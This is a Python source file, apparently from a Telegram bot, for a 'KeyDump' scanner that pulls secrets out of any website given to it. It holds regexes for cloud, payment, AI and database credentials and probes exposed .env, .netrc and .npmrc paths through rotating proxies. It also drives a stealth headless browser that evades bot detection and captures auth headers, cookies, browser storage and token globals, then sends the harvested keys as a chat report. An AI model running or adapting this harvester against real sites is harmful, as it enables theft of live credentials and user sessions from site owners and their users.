    "AWS Session Token": (r"(ASIA[0-9A-Z]{16})", "☁️"),
    "GCP/Firebase API Key": (r"(AIza[0-9A-Za-z\-_]{20,})", "☁️"),
    "GCP OAuth Client ID": (r"([0-9]{8,20}-[a-z0-9]{20,}\.apps\.googleusercontent\.com)", "☁️"),
    "DigitalOcean Token": (r"(dop_v1_[a-f0-9]{64})", "☁️"),
    # AI / ML
    "OpenAI API Key": (r"(sk-[A-Za-z0-9T]{20,})", "🤖"),
    "Anthropic Key": (r"(sk-ant-[A-Za-z0-9\-_]{40,})", "🤖"),
    "HuggingFace Token": (r"(hf_[A-Za-z0-9]{30,})", "🤖"),
    "OpenAI Org": (r"(org-[A-Za-z0-9]{20,40})", "🤖"),
    # Version Control
    "GitHub PAT": (r"(ghp_[A-Za-z0-9]{36,}|gho_[A-Za-z0-9]{36,}|ghu_[A-Za-z0-9]{36,})", "📦"),
    "GitHub Actions Token": (r"(ghs_[A-Za-z0-9]{36,}|ghr_[A-Za-z0-9]{36,})", "📦"),
    "GitLab Token": (r"(glpat-[A-Za-z0-9\-]{20,})", "📦"),
    "NPM Token": (r"(npm_[A-Za-z0-9]{36,})", "📦"),
    # Communication
    "Slack Bot Token": (r"(xoxb-[0-9]+-[0-9]+-[A-Za-z0-9]+)", "📨"),
    "Slack User Token": (r"(xoxp-[0-9A-Za-z\-]{40,})", "📨"),
    "Slack App Token": (r"(xapp-[0-9]-[A-Z0-9]+-[0-9]+-[a-f0-9]+)", "📨"),
    "Slack Webhook URL": (r"(https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+)", "📨"),
    "Discord Webhook URL": (r"(https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+)", "📨"),
    "Twilio Account SID": (r"(AC[a-f0-9]{32})", "📨"),
    "SendGrid API Key": (r"(SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43})", "📨"),
    "Mailchimp API Key": (r"([0-9a-f]{32}-us\d{1,2})", "📨"),
    "Mailgun API Key": (r"(key-[0-9a-zA-Z]{32})", "📨"),
    # Payment
    "Stripe Publishable Key": (r"(pk_(?:live|test)_[A-Za-z0-9]{20,})", "💳"),
    "Stripe Secret Key": (r"(sk_(?:live|test)_[A-Za-z0-9]{20,})", "💳"),
    "Stripe Webhook Secret": (r"(whsec_[A-Za-z0-9]{20,})", "💳"),
    "Square App ID": (r"(sq0idp-[A-Za-z0-9_\-]{20,})", "💳"),
    "Razorpay Key": (r"(rzp_(?:live|test)_[A-Za-z0-9]{10,})", "💳"),
    "Braintree Key": (r"(?:sandbox|production)_[a-z0-9]{8}_[a-z0-9]{16}", "💳"),
    "Adyen API Key": (r"(AQE[a-zA-Z0-9+/]{40,})", "💳"),
    # Firebase / Google
    "Firebase API Key (context)": (r"(?i)(?:apiKey|api_key).{0,15}(AIza[0-9A-Za-z_-]{20,})", "🔥"),
    "Firebase API Key (raw)": (r"(AIza[0-9A-Za-z\-_]{30,})", "🔥"),
    "Firebase authDomain": (r"authDomain.{0,10}([a-z0-9-]+\.firebaseapp\.com)", "🔥"),
    "Firebase projectId": (r"projectId.{0,10}([a-z0-9-]{4,40})", "🔥"),
    "Firebase storageBucket": (r"storageBucket.{0,10}([a-z0-9-]+\.appspot\.com)", "🔥"),
    "Firebase messagingSenderId": (r"messagingSenderId.{0,10}(\d{8,15})", "🔥"),
    "Firebase appId": (r"appId.{0,10}([0-9:a-z-]{10,80})", "🔥"),
    "Firebase DB URL": (r"(https://[a-z0-9\-]+\.firebaseio\.com)", "🔥"),
    "Firebase Storage URL": (r"(https://[a-z0-9\-]+\.appspot\.com)", "🔥"),
    # Social / OAuth
    "Facebook App ID": (r"(?:appId|fbAppId|fb_app_id)[^'\d]{0,15}(\d{10,18})", "📱"),
    "Facebook Pixel ID": (r"fbq.{0,10}init.{0,10}(\d{10,18})", "📱"),
    "Facebook Access Token": (r"(EAAa[A-Za-z0-9]{50,})", "📱"),
    "Google Client ID": (r"([0-9]{8,20}-[a-z0-9]{20,40}\.apps\.googleusercontent\.com)", "📱"),
    "TikTok Pixel": (r"ttq\.load.{0,10}([A-Z0-9]{15,20})", "📱"),
    "LinkedIn Partner ID": (r"_linkedin_partner_id.{0,10}(\d{5,12})", "📱"),
    # Analytics
    "Google Analytics 4": (r"\b(G-[A-Za-z0-9]{8,12})\b", "📊"),
    "Google Analytics UA": (r"\b(UA-\d{5,12}-\d{1,3})\b", "📊"),
    "Google Tag Manager": (r"\b(GTM-[A-Za-z0-9]{6,8})\b", "📊"),
    "Google Ads": (r"\b(AW-\d{8,12})\b", "📊"),
    "Hotjar Site ID": (r"(?:hjid|hjsv).{0,20}(\d{5,12})", "📊"),
    "Mixpanel Token": (r"mixpanel.{0,30}([a-f0-9]{32})", "📊"),
    "Segment Write Key": (r"analytics\.load.{0,20}([A-Za-z0-9]{20,40})", "📊"),
    "Heap Analytics ID": (r"heap\.load.{0,10}(\d{8,12})", "📊"),
    # Captcha
    "reCAPTCHA Sitekey": (r"data-sitekey=[\"']([ A-Za-z0-9_-]{20,60})[\"']", "🔑"),
    "reCAPTCHA v3 render": (r"(?:render|execute).{0,10}([6L][A-Za-z0-9_-]{38})", "🔑"),
    "hCaptcha Sitekey": (r"hcaptcha.{0,30}([a-f0-9-]{36})", "🔑"),
    "Cloudflare Turnstile": (r"([01]x[A-Za-z0-9_-]{10,60})", "🔑"),
    # JWT / Auth
    "JWT Token": (r"(eyJ[A-Za-z0-9\-_]{20,}\.eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{10,})", "🧬"),
    "JWT Secret (env)": (r"(?:JWT_SECRET|jwt_secret).{0,10}([^\s]{8,80})", "🧬"),
    # Secrets / Credentials
    "Private Key PEM": (r"(-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----)", "🔒"),
    "MongoDB URI": (r"(mongodb(?:\+srv)?://[^\s'<>]{10,200})", "🔒"),
    "PostgreSQL URI": (r"(postgres(?:ql)?://[^\s'<>]{10,200})", "🔒"),
    "MySQL URI": (r"(mysql(?:2)?://[^\s'<>]{10,200})", "🔒"),
    "Redis URI": (r"(rediss?://[^\s'<>]{10,150})", "🔒"),
    "Hardcoded Password": (r"(?:password|passwd|pwd)\s*[=:]\s*[']([ ^']{8,60})[']", "🔒"),
    "Secret Key (env)": (r"(?:SECRET_KEY|secret_key).{0,10}([^\s']{12,80})", "🔒"),
    # Generic / Other
    "Bearer Token": (r"[Bb]earer\s+([A-Za-z0-9\-_.]{20,200})", "🌐"),
    "API Key (env var)": (r"(?:api_key|apiKey|API_KEY)\s*[=:]\s*[']([ A-Za-z0-9_-]{20,80})[']", "🌐"),
    "Mapbox Token": (r"(pk\.eyJ[A-Za-z0-9._\-]{20,})", "🌐"),
    "VAPID Public Key": (r"(?:vapidKey|applicationServerKey).{0,10}([A-Za-z0-9_-]{86,90})", "🔔"),
    "SSH Private Key": (r"(ssh-rsa AAAA[A-Za-z0-9+/]{30,})", "🔒"),
}
_KD_CATEGORIES = {
    "☁️": "Cloud & Infra",
    "🤖": "AI / ML",
    "📦": "Version Control / DevOps",
    "📨": "Communication & Messaging",
    "💳": "Payment Gateways",
    "🔥": "Firebase / Google",
    "📱": "Social / OAuth",
    "📊": "Analytics & Tracking",
    "🔑": "Captcha Keys",
    "🧬": "JWT Tokens",
    "🔒": "Secrets & Credentials",
    "🌐": "Generic / Other",
    "🔔": "Push Notifications",
}

# ─── Shannon entropy calculator ───────────────────────────────
def _entropy(s: str) -> float:
    """Calculate Shannon entropy of a string."""
    import math
    if not s:
        return 0.0
    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    length = len(s)
    return -sum((count / length) * math.log2(count / length) for count in freq.values())

# ─── High-entropy string finder ───────────────────────────────
def _find_high_entropy(text: str, threshold: float = 4.2) -> list:
    """Find high-entropy strings (> threshold) — likely secrets. v18: threshold 4.2, hex patterns, limit 30."""
    candidates = []
    # Scan quoted strings
    for m in re.finditer(r'["\']([A-Za-z0-9+/=_\-]{20,120})["\']', text):
        s = m.group(1)
        ent = _entropy(s)
        if ent >= threshold:
            candidates.append({"value": s, "entropy": round(ent, 2), "type": "quoted_string"})
    # v18: bare hex-32 (API keys, tokens, MD5 hashes with secrets)
    for m in re.finditer(r'\b([0-9a-f]{32})\b', text, re.I):
        s = m.group(1)
        ent = _entropy(s)
        if ent >= threshold:
            candidates.append({"value": s, "entropy": round(ent, 2), "type": "hex32"})
    # v18: bare hex-64 (SHA-256 secrets, long tokens)
    for m in re.finditer(r'\b([0-9a-f]{64})\b', text, re.I):
        s = m.group(1)
        ent = _entropy(s)
        if ent >= threshold:
            candidates.append({"value": s, "entropy": round(ent, 2), "type": "hex64"})
    # Deduplicate
    seen = set()
    out  = []
    for c in candidates:
        if c["value"] not in seen:
            seen.add(c["value"])
            out.append(c)
    return sorted(out, key=lambda x: -x["entropy"])[:30]

# ─── Source map fetcher ───────────────────────────────────────
def _fetch_source_maps(js_sources: list, base_url: str) -> list:
    """
    Try to fetch .js.map files for each JS bundle.
    Returns list of (js_url, map_content_text).
    """
    found = []
    for js_url, _ in js_sources[:8]:
        map_url = js_url + ".map"
        try:
            r = requests.get(map_url, timeout=8, verify=False,
                             headers=_get_headers(),
                             proxies=proxy_manager.get_proxy())
            if r.status_code == 200 and "sourcesContent" in r.text:
                found.append((js_url, r.text[:200_000]))
        except Exception:
            pass
    return found

# ─── Playwright-based dynamic scan (network request capture) ──

def _run_playwright_dynamic_keydump(url: str) -> dict:
    """Dynamic keydump via Playwright (Python native)."""
    return _run_playwright_keydump(url)



def _run_playwright_keydump(url: str) -> dict:
    """
    v19 Upgraded keydump dynamic engine:
    - Auth headers from ALL requests + response body token scan
    - localStorage/sessionStorage full dump
    - window globals: auth tokens, API keys, firebase config
    - Source map URL discovery
    - Cookie full capture with domain info
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {"requests": [], "storage": {}, "cookies": [], "_engine": "none"}

    findings = {
        "requests":        [],
        "storage":         {},
        "cookies":         [],
        "window_globals":  {},
        "response_bodies": [],
        "_engine":         "playwright_v19",
    }

    _HDR_INTERESTING = {
        "authorization", "x-api-key", "x-auth-token", "x-access-token",
        "x-client-id", "x-client-secret", "x-app-key", "api-key",
        "x-amz-security-token", "x-firebase-auth", "x-csrf-token",
        "x-session-token", "x-user-token",
    }

    def _filter_headers(hdrs: dict) -> dict:
        out = {}
        for k, v in hdrs.items():
            kl = k.lower()
            if kl in _HDR_INTERESTING or any(
                kw in kl for kw in ("token","key","secret","auth","bearer","session","credential")
            ):
                out[k] = v[:200]
        return out

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
                    "--disable-blink-features=AutomationControlled",
                    "--disable-web-security",
                    "--disable-features=IsolateOrigins,site-per-process",
                ]
            )
            ctx = browser.new_context(
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/122.0.0.0 Safari/537.36"
                ),
                viewport={"width": 1440, "height": 900},
                ignore_https_errors=True,
            )
            ctx.add_init_script(
                "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
                "Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});"
                "window.chrome={runtime:{},loadTimes:function(){},csi:function(){}};"
            )
            page = ctx.new_page()

            def _on_request(req):
                hdrs = _filter_headers(req.headers)
                entry = {"url": req.url[:200], "method": req.method}
                if hdrs:
                    entry["headers"] = hdrs
                try:
                    pd = req.post_data
                    if pd and len(pd) > 3:
                        entry["post_data"] = pd[:500]
                except Exception:
                    pass
                if hdrs or entry.get("post_data"):
                    findings["requests"].append(entry)

            def _on_response(resp):
                ct = resp.headers.get("content-type", "").lower()
                if not any(x in ct for x in ("json", "javascript", "text/plain", "text/html")):
                    return
                if resp.status != 200:
                    return
                try:
                    body = resp.body().decode("utf-8", errors="ignore")
                    if not body or len(body) < 10:
                        return
                    # ── v18: Match _KD_PATTERNS against response body ──────────
                    kd_hits = {}
                    for label, (pat, cat_icon) in _KD_PATTERNS.items():
                        try:
                            raw = re.findall(pat, body, re.IGNORECASE)
                        except Exception:
                            continue
                        flat = []
                        for m in raw:
                            if isinstance(m, tuple):
                                flat.extend([x.strip() for x in m if x and len(x) > 4])
                            else:
                                if m and len(m) > 4:
                                    flat.append(m.strip())
                        if flat:
                            kd_hits[label] = list(dict.fromkeys(flat))[:4]
                    if kd_hits:
                        if "response_hits" not in findings:
                            findings["response_hits"] = {}
                        findings["response_hits"][resp.url[:120]] = kd_hits
                    # ── Original keyword check for full body storage ───────────
                    if any(kw in body for kw in (
                        "token", "api_key", "apikey", "secret", "bearer",
                        "pk_live", "sk_live", "pk_test", "sk_test",
                        "authorization", "credential", "firebase"
                    )):
                        findings["response_bodies"].append({
                            "url":  resp.url[:150],
                            "body": body[:3000],
                        })
                except Exception:
                    pass

            page.on("request",  _on_request)
            page.on("response", _on_response)

            try:
                page.goto(url, wait_until="load", timeout=30_000)
            except PWTimeout:
                pass
            except Exception:
                pass

            try:
                page.wait_for_load_state("networkidle", timeout=10_000)
            except Exception:
                pass

            # Scroll to trigger lazy-loaded auth requests
            try:
                page.evaluate("window.scrollTo(0, document.body.scrollHeight / 2)")
                page.wait_for_timeout(1200)
                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                page.wait_for_timeout(1200)
            except Exception:
                pass

            # ── localStorage + sessionStorage ──
            try:
                storage = page.evaluate("""() => {
                    const ls = {}, ss = {};
                    for(let i=0;i<localStorage.length;i++){
                        const k=localStorage.key(i);
                        const v=localStorage.getItem(k)||'';
                        if(v.length < 2000) ls[k]=v;
                    }
                    for(let i=0;i<sessionStorage.length;i++){
                        const k=sessionStorage.key(i);
                        const v=sessionStorage.getItem(k)||'';
                        if(v.length < 2000) ss[k]=v;
                    }
                    return {localStorage: ls, sessionStorage: ss};
                }""")
                findings["storage"] = storage
            except Exception:
                pass

            # ── window globals deep scan ──
            try:
                wg = page.evaluate("""() => {
                    const out = {};
                    const authKeys = [
                        'token','apiKey','api_key','authToken','accessToken',
                        'access_token','userToken','sessionToken','jwtToken',
                        'bearerToken','credential','firebaseConfig',
                        '__FIREBASE_CONFIG__','__AUTH_TOKEN__','currentUser',
                    ];
                    authKeys.forEach(k => {
                        try {
                            const v = window[k];
                            if (v !== undefined && v !== null) {
                                out[k] = typeof v === 'string'
                                    ? v.substring(0,300)
                                    : JSON.stringify(v).substring(0,500);
                            }
                        } catch(e) {}
                    });
                    Object.keys(window).forEach(k => {
                        try {
                            const kl = k.toLowerCase();
                            if ((kl.includes('token') || kl.includes('auth') ||
                                 kl.includes('session') || kl.includes('credential') ||
                                 kl.includes('firebase') || kl.includes('jwt')) && !out[k]) {
                                const v = window[k];
                                if (typeof v === 'string' && v.length > 10 && v.length < 500)
                                    out[k] = v;
                            }
                        } catch(e) {}
                    });
                    return out;
                }""")
                findings["window_globals"] = wg or {}
            except Exception:
                pass

            # ── Cookies with domain info ──
            try:
                findings["cookies"] = [
                    {"name": c["name"], "value": c["value"][:200], "domain": c.get("domain","")}
                    for c in ctx.cookies()
                ]
            except Exception:
                pass

            # ── Source map candidates ──
            try:
                sm = page.evaluate("""() =>
                    [...document.querySelectorAll('script[src]')]
                        .map(s => s.src + '.map').slice(0,5)
                """)
                findings["source_map_candidates"] = sm or []
            except Exception:
                pass

            browser.close()

    except Exception as e:
        logger.debug("Playwright keydump v19 error: %s", e)

    return findings


# ── v18: Framework globals extractor ──────────────────────────────────────
def _extract_framework_globals(html: str) -> str:
    """
    Extract window/framework state blobs from HTML:
    __NEXT_DATA__, __NUXT__, pageData, __INITIAL_STATE__,
    __REDUX_STATE__, __APP_STATE__, _env_, ENV, config, APP_CONFIG.
    Returns all found JSON/value strings joined into one string.
    """
    parts = []
    patterns = [
        # __NEXT_DATA__ script tag
        re.compile(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>\s*(\{.{20,}?\})\s*</script>', re.S | re.I),
        # window assignments (inline script vars)
        re.compile(r'window\.__NEXT_DATA__\s*=\s*(\{.{10,50000}?\})\s*;', re.S),
        re.compile(r'window\.__NUXT__\s*=\s*(\{.{10,50000}?\})\s*;', re.S),
        re.compile(r'window\.pageData\s*=\s*(\{.{10,20000}?\})\s*;', re.S),
        re.compile(r'window\.__INITIAL_STATE__\s*=\s*(\{.{10,50000}?\})\s*;', re.S),
        re.compile(r'window\.__REDUX_STATE__\s*=\s*(\{.{10,50000}?\})\s*;', re.S),
        re.compile(r'window\.__APP_STATE__\s*=\s*(\{.{10,50000}?\})\s*;', re.S),
        re.compile(r'window\._env_\s*=\s*(\{.{10,10000}?\})\s*;', re.S),
        re.compile(r'window\.ENV\s*=\s*(\{.{10,10000}?\})\s*;', re.S),
        re.compile(r'window\.config\s*=\s*(\{.{10,10000}?\})\s*;', re.S),
        re.compile(r'window\.APP_CONFIG\s*=\s*(\{.{10,10000}?\})\s*;', re.S),
        re.compile(r'window\.appConfig\s*=\s*(\{.{10,10000}?\})\s*;', re.S),
        # var/const/let assignments at top level in script tags
        re.compile(r'(?:var|let|const)\s+__NEXT_DATA__\s*=\s*(\{.{10,50000}?\})\s*;', re.S),
    ]
    for pat in patterns:
        for m in pat.finditer(html):
            blob = m.group(1).strip()
            if blob and len(blob) > 10:
                parts.append(blob[:20000])  # cap per-blob at 20KB
    return "\n".join(parts)


def _extract_html_comments(html: str) -> str:
    """
    Extract all HTML comments <!-- ... --> with content length > 10.
    Useful for finding dev notes, debug info, API keys left in comments.
    """
    comments = re.findall(r'<!--([\s\S]*?)-->', html)
    return "\n".join(c.strip() for c in comments if len(c.strip()) > 10)


# ─── Master keydump engine ────────────────────────────────────
def _probe_env_files(base_url: str) -> list:
    """
    Phase 2: Probe common .env / config file paths that expose secrets.
    Returns list of (path, content_snippet) tuples for found files.
    """
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    probe_paths = [
        "/.env",
        "/.env.local",
        "/.env.example",
        "/.env.development",
        "/.env.production",
        "/.env.staging",
        "/.env.test",
        "/.env.backup",
        "/.env.old",
        "/.env.bak",
        "/config/.env",
        "/backend/.env",
        "/app/.env",
        "/api/.env",
        "/.config",
        "/config.env",
        "/application.properties",
        "/application.yml",
        "/secrets.yml",
        "/credentials.yml",
        "/.npmrc",
        "/.netrc",
    ]
    found = []
    seen_content = set()

    def _probe_one(path):
        try:
            r = requests.get(
                origin + path, timeout=6, verify=False,
                headers=_get_headers(),
                proxies=proxy_manager.get_proxy(),
                allow_redirects=False,
            )
            if r.status_code != 200:
                return None
            body = r.text[:8000]
            # Must look like a real env file — not an HTML 200 catch-all
            if "<html" in body.lower() or "<body" in body.lower():
                return None
            # Must contain at least one key=value pattern
            if not re.search(r'[A-Z_]{3,}=.{3,}', body):
                return None
            sig = hashlib.md5(body[:512].encode()).hexdigest()
            if sig in seen_content:
                return None
            seen_content.add(sig)
            return (path, body[:3000])
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        futures = {ex.submit(_probe_one, p): p for p in probe_paths}
        for fut in concurrent.futures.as_completed(futures, timeout=30):
            try:
                res = fut.result(timeout=8)
                if res:
                    found.append(res)
            except Exception:
                pass

    return found


def _run_keydump_sync(url: str) -> dict:
    """
    Phase 2 — Full keydump:
      1. Static HTML + JS bundles
      2. Pattern scan (50+ _KD_PATTERNS)
      3. High-entropy (threshold 4.2, down from 4.5)
      4. Source map extraction + scan
      5. .env file probe (20 paths)
      6. Dynamic via Playwright
    """
    out = {
        "url":          url,
        "js_count":     0,
        "by_category":  {},
        "high_entropy": [],
        "source_maps":  [],
        "env_files":    [],   # NEW: .env probe results
        "dynamic":      {"requests": [], "storage": {}, "cookies": []},
        "raw_hits":     {},
        "errors":       [],
    }

    # ── 1. Fetch static HTML + JS bundles ────────────────────────────────────
    try:
        data = _scrape_full(url, max_js=20)
    except Exception as e:
        out["errors"].append(f"Fetch error: {e}")
        return out

    if not data["html"]:
        out["errors"].append("Page fetch failed — site may block bots")
        return out

    # Inline <script> blocks
    inline_scripts = []
    try:
        soup_kd = BeautifulSoup(data["html"], "html.parser")
        for tag in soup_kd.find_all("script"):
            if not tag.get("src") and tag.string:
                txt = tag.string.strip()
                if len(txt) > 30:
                    inline_scripts.append(txt)
    except Exception:
        pass

    fw_globals    = _extract_framework_globals(data["html"])
    html_comments = _extract_html_comments(data["html"])
    corpus_parts  = (
        [data["html"]]
        + inline_scripts
        + [js for _, js in data["js_sources"]]
    )
    if fw_globals:
        corpus_parts.append(fw_globals)
    if html_comments:
        corpus_parts.append(html_comments)
    corpus = "\n".join(corpus_parts)
    out["js_count"]      = len(data["js_sources"])
    out["inline_scripts"] = len(inline_scripts)

    # ── 2. Pattern scan ───────────────────────────────────────────────────────
    for label, (pat, cat_icon) in _KD_PATTERNS.items():
        try:
            raw = re.findall(pat, corpus, re.IGNORECASE)
        except Exception:
            continue
        flat = []
        for m in raw:
            if isinstance(m, tuple):
                flat.extend([x.strip() for x in m if x and len(x) > 4])
            else:
                if m and len(m) > 4:
                    flat.append(m.strip())
        unique = list(dict.fromkeys(flat))[:8]
        if unique:
            out["raw_hits"][label] = unique
            out["by_category"].setdefault(cat_icon, {})[label] = unique

    # ── 3. High-entropy — threshold 4.2 (was 4.5) ────────────────────────────
    # Lowering from 4.5 → 4.2 catches more real secrets (AWS, GCP tokens,
    # random API keys) while hex-32/hex-64 patterns add structural coverage.
    out["high_entropy"] = _find_high_entropy(corpus, threshold=4.2)

    # ── 4. Source maps ────────────────────────────────────────────────────────
    try:
        maps = _fetch_source_maps(data["js_sources"], url)
        if maps:
            for js_url, map_text in maps:
                for label, (pat, cat_icon) in _KD_PATTERNS.items():
                    try:
                        raw = re.findall(pat, map_text, re.IGNORECASE)
                    except Exception:
                        continue
                    flat = []
                    for m in raw:
                        if isinstance(m, tuple):
                            flat.extend([x.strip() for x in m if x and len(x) > 4])
                        else:
                            if m and len(m) > 4:
                                flat.append(m.strip())
                    if flat:
                        sm_label = f"{label} (sourcemap)"
                        existing = out["by_category"].setdefault(cat_icon, {}).get(sm_label, [])
                        out["by_category"][cat_icon][sm_label] = list(
                            dict.fromkeys(existing + flat[:4])
                        )
            out["source_maps"] = [js_url for js_url, _ in maps]
    except Exception as e:
        out["errors"].append(f"Sourcemap: {e}")

    # ── 5. .env file probe ────────────────────────────────────────────────────
    try:
        env_files = _probe_env_files(url)
        out["env_files"] = env_files
        # Scan found .env content through _KD_PATTERNS too
        for env_path, env_body in env_files:
            for label, (pat, cat_icon) in _KD_PATTERNS.items():
                try:
                    raw = re.findall(pat, env_body, re.IGNORECASE)
                except Exception:
                    continue
                flat = [x.strip() if not isinstance(x, tuple) else
                        next((g.strip() for g in x if g), "") for x in raw]
                flat = [v for v in flat if len(v) > 4]
                if flat:
                    env_label = f"{label} ({env_path})"
                    existing  = out["by_category"].setdefault(cat_icon, {}).get(env_label, [])
                    out["by_category"][cat_icon][env_label] = list(
                        dict.fromkeys(existing + flat[:6])
                    )
    except Exception as e:
        out["errors"].append(f"Env probe: {e}")

    # ── 6. Dynamic via Playwright ─────────────────────────────────────────────
    try:
        dyn = _run_playwright_dynamic_keydump(url)
        out["dynamic"] = dyn

        for store_name, store_data in dyn.get("storage", {}).items():
            if not isinstance(store_data, dict):
                continue
            for k, v in store_data.items():
                if not v:
                    continue
                for label, (pat, cat_icon) in _KD_PATTERNS.items():
                    try:
                        if re.search(pat, str(v), re.IGNORECASE):
                            store_label = f"{label} ({store_name})"
                            bucket = out["by_category"].setdefault(cat_icon, {})
                            bucket.setdefault(store_label, []).append(
                                f"{k}={str(v)[:60]}"
                            )
                    except Exception:
                        pass
    except Exception as e:
        out["errors"].append(f"Dynamic: {e}")

    return out


def _kd_confidence(label: str, value: str) -> tuple:
    """
    Phase 3: Assign confidence level to a keydump hit.
    Returns (badge: str, level: str)
      HIGH  — known prefix/format that is unambiguous (AKIA, pk_live_, ghp_, etc.)
      MED   — pattern match with keyword context but no unique prefix
      LOW   — entropy-only or weak-context match
    """
    v = value.strip()
    # ── HIGH confidence: hard vendor prefixes ────────────────────────────────
    HIGH_PREFIXES = (
        "AKIA", "ASIA", "AROA",          # AWS keys
        "AIza",                          # GCP / Firebase
        "dop_v1_",                       # DigitalOcean
        "sk-ant-",                       # Anthropic
        "hf_",                           # HuggingFace
        "ghp_", "gho_", "ghu_",          # GitHub PAT
        "ghs_", "ghr_",                  # GitHub Actions
        "glpat-",                        # GitLab
        "npm_",                          # NPM
        "xoxb-", "xoxp-", "xapp-",      # Slack tokens
        "SG.",                           # SendGrid
        "pk_live_", "pk_test_",          # Stripe publishable
        "sk_live_", "sk_test_",          # Stripe secret
        "whsec_",                        # Stripe webhook
        "rk_live_", "rk_test_",          # Stripe restricted
        "sq0idp-", "sq0atp-",            # Square
        "rzp_live_", "rzp_test_",        # Razorpay
        "AQE",                           # Adyen
        "EAAa",                          # Facebook access token
        "eyJ",                           # JWT (structural)
        "-----BEGIN",                    # PEM private key
        "pk.eyJ",                        # Mapbox
        "sk-",                           # OpenAI (sk- prefix)
        "AC",                            # Twilio SID (AC + 32 hex)
        "mongodb://", "mongodb+srv://",  # DB URIs
        "postgres://", "postgresql://",
        "mysql://", "mysql2://",
        "redis://", "rediss://",
    )
    # HIGH: value starts with a hard prefix
    for prefix in HIGH_PREFIXES:
        if v.startswith(prefix):
            return ("🟢 HIGH", "HIGH")
    # HIGH: label explicitly names a live key
    if any(x in label for x in ("live", "Live", "Private Key", "Secret Key", "Webhook Secret")):
        return ("🟢 HIGH", "HIGH")
    # HIGH: URL-form credentials (contains :// and @ → auth in URI)
    if "://" in v and "@" in v:
        return ("🟢 HIGH", "HIGH")

    # ── MED confidence: keyword-context pattern hits ──────────────────────────
    MED_LABELS = (
        "API Key", "Access Token", "Auth", "Bearer", "Password",
        "Secret", "Credential", "Token", "Client ID", "Client Secret",
        "Firebase", "Analytics", "Tag Manager", "Pixel",
        "reCAPTCHA", "hCaptcha", "Turnstile",
    )
    for kw in MED_LABELS:
        if kw.lower() in label.lower():
            return ("🟡 MED", "MED")
    # MED: long alphanumeric string (≥24 chars, mixed case)
    if len(v) >= 24 and re.search(r'[A-Z]', v) and re.search(r'[a-z]', v) and re.search(r'\d', v):
        return ("🟡 MED", "MED")

    # ── LOW: everything else (short strings, digits-only, analytics IDs) ─────
    return ("⚪ LOW", "LOW")


def _format_keydump_report(result: dict) -> tuple:
    """
    Phase 3 — Full keydump report with per-hit confidence badges.
    Returns (telegram_text: str, full_json: dict)
    """
    url      = result["url"]
    domain   = urlparse(url).netloc
    path     = urlparse(url).path or "/"
    js_cnt   = result["js_count"]
    cats     = result["by_category"]
    entropy  = result["high_entropy"]
    dyn      = result["dynamic"]
    smaps    = result["source_maps"]
    env_files = result.get("env_files", [])

    total_hits = sum(len(v) for cat in cats.values() for v in cat.values())

    # ── Confidence tally ──────────────────────────────────────────────────────
    conf_counts = {"HIGH": 0, "MED": 0, "LOW": 0}
    for cat_data in cats.values():
        for label, vals in cat_data.items():
            for v in vals:
                _, lvl = _kd_confidence(label, v)
                conf_counts[lvl] += 1

    js_mode    = "⚡ JS+Static+Dynamic" if PLAYWRIGHT_OK else "📄 Static+JS"
    inline_cnt = result.get("inline_scripts", 0)

    # ── Confidence summary line ───────────────────────────────────────────────
    conf_line = (
        f"🟢 `{conf_counts['HIGH']}` HIGH  "
        f"🟡 `{conf_counts['MED']}` MED  "
        f"⚪ `{conf_counts['LOW']}` LOW"
    )

    lines = [
        f"🔑 *KeyDump v22 — Full Scan*",
        f"🌐 `{domain}`",
        f"📁 Path: `{path}`",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"📦 JS: `{js_cnt}` | Inline: `{inline_cnt}` | {js_mode}",
        f"📊 Patterns: `{len(_KD_PATTERNS)}` | Hits: `{total_hits}`",
        conf_line,
        "",
    ]

    if total_hits == 0 and not entropy and not dyn.get("requests"):
        lines += [
            "✅ *Nothing exposed in source*",
            "",
            "_Keys may be server-side only, in env vars, or obfuscated_",
            "",
            f"📌 Scanned: HTML + `{js_cnt}` JS files",
            f"🔍 High-entropy strings checked: `{len(entropy)}`",
        ]
    else:
        # ── Per-category results with confidence badge ────────────────────────
        for cat_icon, cat_name in _KD_CATEGORIES.items():
            if cat_icon not in cats:
                continue
            cat_data = cats[cat_icon]
            count = sum(len(v) for v in cat_data.values())
            lines.append(f"{cat_icon} *{cat_name}* `({count})`")
            for label, vals in cat_data.items():
                # Show confidence badge for first value (representative)
                badge, _ = _kd_confidence(label, vals[0]) if vals else ("⚪ LOW", "LOW")
                lines.append(f"  ┌ {badge} *{label}*")
                for v in vals[:3]:
                    safe = v.replace("`", "'")
                    lines.append(f"  └ `{safe[:70]}`")
            lines.append("")

        # ── .env file hits (Phase 2) ─────────────────────────────────────────
        if env_files:
            lines.append(f"📄 *Exposed Config Files* `({len(env_files)})`")
            for env_path, env_body in env_files[:5]:
                lines.append(f"  🟢 HIGH `{env_path}`")
                # Show first 2 non-empty lines of env file
                preview = [l for l in env_body.splitlines() if "=" in l and len(l) > 5]
                for pl in preview[:2]:
                    safe = pl.replace("`", "'")
                    lines.append(f"  └ `{safe[:65]}`")
            lines.append("")

        # ── Dynamic / network interception ───────────────────────────────────
        if dyn.get("requests"):
            lines.append(f"🌐 *Network Intercepted Tokens* `({len(dyn['requests'])})`")
            for req in dyn["requests"][:4]:
                lines.append(f"  🔗 `{req['url'][:50]}`")
